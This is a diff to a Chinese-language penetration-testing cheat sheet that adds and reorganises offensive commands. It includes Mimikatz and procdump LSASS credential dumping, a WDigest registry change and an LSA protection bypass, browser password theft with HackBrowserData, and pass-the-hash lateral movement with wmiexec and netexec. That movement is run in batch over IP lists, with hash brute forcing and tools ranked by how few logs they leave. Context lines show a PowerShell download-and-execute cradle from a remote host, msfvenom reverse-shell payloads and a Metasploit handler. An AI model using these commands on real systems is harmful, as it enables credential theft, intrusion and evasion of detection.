@@ -446,12 +446,17 @@ casper
 
 </details>
 
+## 密码抓取
+### Mimikatz抓Windows
 
-## Mimikatz
+https://github.com/gentilkiwi/mimikatz/releases
+dump工具
+https://docs.microsoft.com/en-us/sysinternals/downloads/procdump
 
 一条命令
 ```
-.\mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit
+
+mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords full" "exit"
 ```
 控制台执行多条命令，用log防止进程崩溃，数据丢失
 ```
@@ -468,12 +473,27 @@ mimikatz_command -f sekurlsa::wdigest
 注册表开启wdigest,08r2后默认关闭。需要目标注销，重新登录。2016需要重启。
 ```
 reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /f /d 1
+
+
 ```
-### bypass lsa Protection(ppl)
-查询是否启用
+
+从内存获取
+```
+ procdump64.exe -accepteula -ma lsass.exe lsass.dmp 
+```
+
+
+ 获取到 lsass.dmp文件后可以用
+```
+ mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit
+```
+
+#### bypass lsa Protection(ppl)
+
+
+查询是否启用LSA，开启后，上面的方法就无法正常抓密码，此时用如下方法。
 ```
 reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa
-
 ```
 把mimidriver.sys拷贝到同级目录，进行加载bypass
 ```
@@ -487,7 +507,14 @@ mimikatz # !-
 ```
 
 
+### 浏览器密码
+https://github.com/moonD4rk/HackBrowserData/releases/tag/v0.4.6
 
+```
+结果输出在results中
+
+.\hack-browser-data.exe -b all -f json --dir results --zip
+```
 
 
 ## cs凭证解析
@@ -499,15 +526,6 @@ awk -F":::" '{print $1}' credentials.txt | awk -F"\\" '{print $2}'
 提取hash
 ```
 awk -F":::" '{print $2}' credentials.txt
-```
-
-
-
-
-
-## ping存活主机扫描
-```
-for /L %I in (1,1,256) DO @ping -w 1 -l 1 192.168.202.%I | findstr "TTL="
 ```
 
 
@@ -1290,7 +1308,7 @@ PROGRA~1
 PROGRA~2
 ```
 
-## 无文件落地
+## powershell无文件落地执行
 powershell不落地文件执行
 ```
 powershell -c "Invoke-Expression (New-Object Net.WebClient).DownloadString("http://xxx.xx.xx.xx/test.ps1")"
@@ -1730,7 +1748,18 @@ ps -ef
 
 
 
+## ping存活主机扫描
+```
+for /L %I in (1,1,256) DO @ping -w 1 -l 1 192.168.202.%I | findstr "TTL="
+```
+
+
+
+
 ## at&schtasks&sc横向
+
+pth和ptt使用
+
 
 使用明文密码登录到目标，需要445和139端口开启：
 ```
@@ -1756,6 +1785,16 @@ sc \\192.168.210.107 start hacker      #启动hacker服务
 ## impacket包横向命令
 
 内网横向移动工具
+
+优先，wmi或者dcom。psexec直接不要用。
+
+| **工具**       | **核心依赖**   | **防火墙友好度** | **隐蔽性 (免杀)** | **日志留存 (特征)**       |
+| ------------ | ---------- | ---------- | ------------ | ------------------- |
+| **Smbexec**  | 445 (SMB)  | ⭐⭐⭐⭐⭐      | ⭐⭐           | **极高** (大量服务日志)     |
+| **Atexec**   | 445 (RPC)  | ⭐⭐⭐        | ⭐⭐⭐          | **中** (计划任务日志)      |
+| **Wmiexec**  | 135 + 动态端口 | ⭐⭐         | ⭐⭐⭐⭐         | **低** (WmiPrvSE子进程) |
+| **Dcomexec** | 135 + 动态端口 | ⭐⭐         | ⭐⭐⭐⭐⭐        | **极低** (合法进程调用)     |
+|              |            |            |              |                     |
 
 445为smb端口   
 135为rpc端口，可以用dcom和wmi  
@@ -1798,7 +1837,7 @@ dcomexec.exe hacker/administrator:abc123@192.168.202.148 "whoami"
 dcomexec.exe -hashes :fac5d668099409cb6fa223a32ea493b6 hacker/administrator@192.168.202.148 "whoami"
 ```
 
-psexec
+psexec（不推荐）
 ```
 官方Psexec第一种利用方法：可以先有ipc链接，再用psexec运行相应的程序：
 Net use \192.168.202.148\ipc$ zxcvbnm123 /user:test\Administrator
@@ -1817,7 +1856,7 @@ Smbexec test/Administrator:zxcvbnm123@192.168.202.148
 Smbexec -hashes :fac5d668099409cb6fa223a32ea493b6 test/Administrator@192.168.202.148
 ```
 
-wmi
+wmi(推荐)
 ```
 WMI利用135端口，支持明文和hash两种方式进行身份验证，且系统日志不记录。
 第一种：使用系统自带的WMIC明文传递执行相应命令，但执行的结果不回显（先管理员账户登录）
@@ -1830,23 +1869,38 @@ Cscript //nologo wmiexec.vbs /shell 192.168.202.148 Administrator zxcvbnm123
 Wmiexec test/Administrator:zxcvbnm123@192.168.202.148 "whoami"
 Wmiexec -hashes :fac5d668099409cb6fa223a32ea493b6 test/Administrator@192.168.202.148 "whoami"
 
+
+wmiexec -hashes 00000000000000000000000000000000:ccef208c6485269c20db2cad21734fe7 workgroup/administrator@192.168.3.21 "whoami"
+
+python wmiexec -hashes 00000000000000000000000000000:3617ad523f47fc96f24c45943affd954 administrator@192.168.1.131 
+
+批量
+FOR /F %i in (ips.txt) do wmiexec -hashes 00000000000000000000000000000:a194552f8dd6d260d61dd99262264530 workgroup/admin@%i "whoami"
+
+FOR /F %i in (ips.txt) do wmiexec -hashes 00000000000000000000000000000:fac5d668099409cb6fa223a32ea493b6 admin@%i "whoami"
+
+FOR /F %i in (ips.txt) do wmiexec -hashes :a194552f8dd6d260d61dd99262264530 admin@%i "whoami"
 ```
 
 批量操作,需要保存为bat执行
 ```
 用已知密码和用户，批量连接ip:
-FOR /F %%i in (ips.txt) do net use \%%i\ipc$ “password” /user:hacker\administrator
+FOR /F %i in (ips.txt) do net use \%i\ipc$ "password" /user:hacker\administrator
 
 已知用户和ip，批量连接密码(爆破密码)：
-FOR /F %%i in (pass.txt) do net use \192.168.202.148\ipc$ "%%i" /user:test\administrator
+FOR /F %i in (pass.txt) do net use \192.168.202.148\ipc$ "%i" /user:test\administrator
 
 已知用户和ip，批量连接hash(爆破hash)：
-FOR /F %%i in (hash.txt) do atexec.exe -hashes :"%%i" test/administrator@192.168.202.148 "whoami"
+FOR /F %i in (hash.txt) do Wmiexec.exe -hashes :"%i" test/administrator@192.168.202.148 "whoami"
+
+FOR /F %i in (ips.txt) do Wmiexec -hashes :fac5d668099409cb6fa223a32ea493b6 test/Administrator@%i "whoami"
+
+
 ```
 精准批量法
 ```
 shell for /l %i in (1,1,253) do echo 172.22.13.%i >>tip.txt
-shell for /f %i in (tip.txt) do ping -n 1 -w 10 %i | find /i "ttl" >nul && echo %%i >>ok.tx
+shell for /f %i in (tip.txt) do ping -n 1 -w 10 %i | find /i "ttl" >nul && echo %i >>ok.tx
 shell for /f %i in (ok.txt) do dir \\%i\c$\users >>result.txt
 ```
 
@@ -1865,7 +1919,65 @@ cme ldap 10.11.12.211 -u 'username' -p 'password' --kdcHost 10.11.12.211 --users
 ```
 
 
-## 反弹shell(流量太敏感，尽量加密用)
+cme停止维护，替代品为netexec
+https://github.com/Pennyw0rth/NetExec
+
+干净的linux环境
+```
+# 安装编译需要的工具
+yum groupinstall "Development Tools"
+yum install zlib-devel bzip2-devel openssl-devel ncurses-devel \
+sqlite-devel readline-devel tk-devel \
+xz-devel python3-devel libffi-devel
+
+# 安装 pyenv
+curl https://pyenv.run | bash
+
+# 添加到 shell 配置文件
+echo 'export PATH="$HOME/.pyenv/bin:$PATH"' >> ~/.bashrc
+echo 'eval "$(pyenv init -)"' >> ~/.bashrc
+echo 'eval "$(pyenv virtualenv-init -)"' >> ~/.bashrc
+source ~/.bashrc
+
+pyenv install 3.10.0
+pyenv global 3.10.0
+
+python -m pip install --upgrade pip
+```
+
+安装
+```
+
+python3 -m pip install --user pipx
+python3 -m pipx ensurepath
+python3 -m pipx install git+https://github.com/Pennyw0rth/NetExec
+
+安装失败就直接用pip
+python -m pip install --upgrade pip
+python -m pip install --user git+https://github.com/Pennyw0rth/NetExec
+```
+
+使用和cme几乎一样
+https://www.netexec.wiki/
+
+```
+nxc <protocol> <target(s)> -u username -p password
+nxc <protocol> <IP> -d <DOMAIN> -u Administrator -p 'password'
+
+
+nxc smb 192.168.1.50 -u 'admin' -p 'pass' -x 'whoami'
+
+nxc smb 192.168.1.50 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0' -x 'whoami'
+
+
+nxc smb 192.168.1.50 -d test -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0' -x 'whoami'
+
+
+```
+
+
+
+# 反弹shell(流量太敏感，尽量加密用)
 
 ## nc
 
@@ -1972,7 +2084,7 @@ chmod +x ./metasploit-latest-linux-x64-installer.run
 ./metasploit-latest-linux-x64-installer.run
 ```
 
-payload生成
+### payload生成
 
 Linux
 
@@ -2071,6 +2183,89 @@ Mac Based Shellcode
 msfvenom -p osx/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=808 -f <language>
 ```
 
+
+```
+
+Framework Executable Formats [--format <value>]
+===============================================
+
+    Name
+    ----
+    asp
+    aspx
+    aspx-exe
+    axis2
+    dll
+    ducky-script-psh
+    elf
+    elf-so
+    exe
+    exe-only
+    exe-service
+    exe-small
+    hta-psh
+    jar
+    jsp
+    loop-vbs
+    macho
+    msi
+    msi-nouac
+    osx-app
+    psh
+    psh-cmd
+    psh-net
+    psh-reflection
+    python-reflection
+    vba
+    vba-exe
+    vba-psh
+    vbs
+    war
+
+
+
+Framework Transform Formats [--format <value>]
+==============================================
+
+    Name
+    ----
+    base32
+    base64
+    bash
+    c
+    csharp
+    dw
+    dword
+    go
+    golang
+    hex
+    java
+    js_be
+    js_le
+    masm
+    nim
+    nimlang
+    num
+    octal
+    perl
+    pl
+    powershell
+    ps1
+    py
+    python
+    raw
+    rb
+    ruby
+    rust
+    rustlang
+    sh
+    vbapplication
+    vbscript
+    zig
+```
+
+
+
 ## Meterpreter基本命令
 
 首先需要先获取meterpreter：
@@ -2079,6 +2274,7 @@ msfvenom -p osx/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=808 -f <language>
 use exploit/multi/handler
 set payload windows/meterpreter/reverse_tcp
 #set payload linux/x64/meterpreter/reverse_tcp
+#set payload cmd/unix/reverse_bash
 set LHOST 0.0.0.0
 set lPORT 6789
 set ExitOnSession false
